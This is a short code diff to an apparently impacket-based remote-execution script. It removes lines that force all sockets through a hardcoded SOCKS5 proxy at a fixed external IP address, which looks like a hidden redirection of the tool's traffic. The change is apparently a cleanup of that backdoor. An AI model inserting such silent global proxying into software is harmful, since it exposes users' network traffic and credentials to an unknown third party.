@@ -57,14 +57,6 @@ from impacket import version, smbserver
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.krb5.keytab import Keytab
 
-# Set up SOCKS5 proxy
-SOCKS5_PROXY_HOST = '45.136.15.77'
-SOCKS5_PROXY_PORT = 5000
-
-# Apply the SOCKS5 proxy to the default socket
-socks.set_default_proxy(socks.SOCKS5, SOCKS5_PROXY_HOST, SOCKS5_PROXY_PORT)
-socket.socket = socks.socksocket
-
 OUTPUT_FILENAME = '__output'
 SMBSERVER_DIR   = '__tmp'
 DUMMY_SHARE     = 'TMP'
